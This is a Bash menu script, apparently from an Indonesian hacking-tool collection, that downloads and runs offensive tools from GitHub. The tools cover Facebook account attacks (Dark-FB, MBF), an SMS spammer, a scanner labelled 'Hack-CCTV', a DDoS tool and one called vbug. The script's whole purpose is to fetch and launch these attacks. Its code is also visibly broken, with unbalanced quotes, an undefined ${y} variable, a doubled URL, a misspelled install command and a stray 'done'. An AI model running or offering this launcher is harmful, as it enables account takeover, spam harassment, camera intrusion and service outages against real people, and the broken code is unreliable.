#!/bin/bash
#version 1.0

# Variables
b='\033[1m'
u='\033[4m'
bl='\E[30m'
r='\E[31m'
g='\E[32m'
bu='\E[34m'
m='\E[35m'
c='\E[36m'
w='\E[37m'
endc='\E[0m'
enda='\033[0m'
blue='\e[1;34m'
cyan='\e[1;36m'
red='\e[1;31m'

figlet PSG"v1.0 | lolcat
echo  "_____________________________________________________"
echo  "Tools    : PSG $white         " |lolcat
echo  "Creadby  : PSG $white   " |lolcat
echo  "Contact  : +62 ************  $white " |lolcat
echo  "_____________________________________________________"

###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[#]> (Ctrl + C ) Detected, Trying To Exit ... "
echo -e $cyan"[#]> Thanks"
sleep 1
echo ""
echo -e $white"[#]> see you gaes :)..."
sleep 1
exit
}

lagi=1
while [ $lagi -lt 6 ];
do
echo ""
echo  "1.  Dark-FB" | lolcat
echo  "============================" | lolcat
echo  "2.  vbug" | lolcat
echo  "============================" | lolcat
echo  "3.  SpamSms" | lolcat
echo  "============================" | lolcat
echo  "4   MBF" | lolcat
echo  "============================" | lolcat
echo  "5.  Hack-CCTV" | lolcat
echo  "============================" | lolcat
echo  "6. DDOS" | lolcat
echo  "============================" | lolcat
echo  "00. EXIT" | lolcat
echo  "============================" | lolcat
echo ""
echo  "╭─0day" |lolcat
read  "╰─#" pil;

# Dark-FB

case $pil in
1) git clone https://github.com/FarizPrasetyo/Dark-FB
${y} cd Dark-FB
${y} python2 Dark.py
echo

;;

# vbug

2) git clone https://github.com/https://github.com/d3L3t3dOn3/vbug
${y} cd vbug"
${y} unzip vbug.zip
${y} cd vbug
${y} python2 vbug.py
echo

;;

#SpamSms

3) git clone https://github.com/BCA-X666X-MCC/SMS-X666X
${y} apt install ruby
${y} apt inlstall cowsay
${y} gem install lolcat
${y} cd SMS-X666X
${y} sh SpamSms.sh
echo

;;

#MBF

4) git clone https://github.com/pirmansx/mbf
${y} cd mbf
${y} python2 MBF.py
echo 

;;

#Hack-CCTV

5) git clone https://github.com/kancotdiq/ipcs
${y} cd ipcs
${y} python2 scan.py
echo 

;;

#DDOS

6) git clone http://github.com/cyweb/hammer
${y} cd hammer
${y} python2 hammer.py
echo 

;;

00) echo "created by : PSG" | lolcat
exit
;;

*) echo "sorry, jika kurang lengkap"
esac
done
done